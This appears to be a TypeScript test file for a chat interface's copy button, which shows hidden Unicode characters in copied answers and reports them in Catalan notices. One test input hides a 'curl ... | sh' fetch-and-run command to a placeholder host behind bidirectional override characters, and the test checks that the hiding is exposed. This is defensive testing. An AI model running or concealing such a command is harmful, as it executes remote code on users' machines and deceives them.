import { afterEach, describe, expect, it, vi } from 'vitest';
import { copyText } from './clipboard';
import { answerForClipboard, hiddenCopyNotice } from './hidden-chars';

afterEach(() => {
  vi.unstubAllGlobals();
});

function stubClipboard(): string[] {
  const written: string[] = [];
  vi.stubGlobal('isSecureContext', true);
  vi.stubGlobal('navigator', {
    clipboard: {
      writeText: async (text: string) => {
        written.push(text);
      },
    },
  });
  return written;
}

/** What the copy button of an answer does (CopyButton with prepare={answerForClipboard}). */
async function copyAnswer(answer: string): Promise<{ ok: boolean; notice: string | null }> {
  const { text, notice } = answerForClipboard(answer);
  return { ok: await copyText(text), notice };
}

describe('whole-answer copy button', () => {
  it('puts the hidden characters on the clipboard as visible marks', async () => {
    const written = stubClipboard();
    const answer = 'Executa:\n\n```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```\n\nI `a\u200Bb`.';
    await expect(copyAnswer(answer)).resolves.toEqual({
      ok: true,
      notice: "La resposta tenia 3 caràcters invisibles: s'han copiat com a ⟨U+…⟩.",
    });
    expect(written).toEqual([
      'Executa:\n\n```bash\necho ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n```\n\nI `a⟨U+200B⟩b`.',
    ]);
  });

  it('copies ordinary answers unchanged', async () => {
    const written = stubClipboard();
    await expect(copyAnswer('Hola 👩\u200D💻 שלום')).resolves.toEqual({ ok: true, notice: null });
    expect(written).toEqual(['Hola 👩\u200D💻 שלום']);
  });

  it('keeps legitimate joiners, marks and soft hyphens of the prose (K14)', async () => {
    const written = stubClipboard();
    const answer = 'Persa: می\u200Cخواهم. שלום\u200F! an\u00ADtic, a\u200Db.\n\nI en codi: `می\u200Cخواهم`';
    await expect(copyAnswer(answer)).resolves.toEqual({
      ok: true,
      notice: "La resposta tenia 1 caràcter invisible: s'ha copiat com a ⟨U+…⟩.",
    });
    expect(written).toEqual(['Persa: می\u200Cخواهم. שלום\u200F! an\u00ADtic, a\u200Db.\n\nI en codi: `می⟨U+200C⟩خواهم`']);
  });

  it('copies a block with too many hidden characters as one mark with their count (K13)', async () => {
    const written = stubClipboard();
    await expect(copyAnswer(`\`\`\`\nls${'\u200B'.repeat(300)}\n\`\`\``)).resolves.toEqual({
      ok: true,
      notice: "La resposta tenia 300 caràcters invisibles: no s'han copiat.",
    });
    expect(written).toEqual(['```\nls⟨300 caràcters invisibles eliminats⟩\n```']);
  });
});

describe('hiddenCopyNotice', () => {
  it('says nothing for ordinary answers', () => {
    expect(hiddenCopyNotice(0, 0)).toBeNull();
  });

  it('explains what happened to the hidden characters', () => {
    expect(hiddenCopyNotice(1, 0)).toBe("La resposta tenia 1 caràcter invisible: s'ha copiat com a ⟨U+…⟩.");
    expect(hiddenCopyNotice(3, 0)).toBe("La resposta tenia 3 caràcters invisibles: s'han copiat com a ⟨U+…⟩.");
    expect(hiddenCopyNotice(0, 1)).toBe("La resposta tenia 1 caràcter invisible: no s'ha copiat.");
    expect(hiddenCopyNotice(0, 300)).toBe("La resposta tenia 300 caràcters invisibles: no s'han copiat.");
    expect(hiddenCopyNotice(2, 300)).toBe(
      "La resposta tenia 302 caràcters invisibles: 2 s'han copiat com a ⟨U+…⟩ i 300 no s'han copiat.",
    );
  });
});
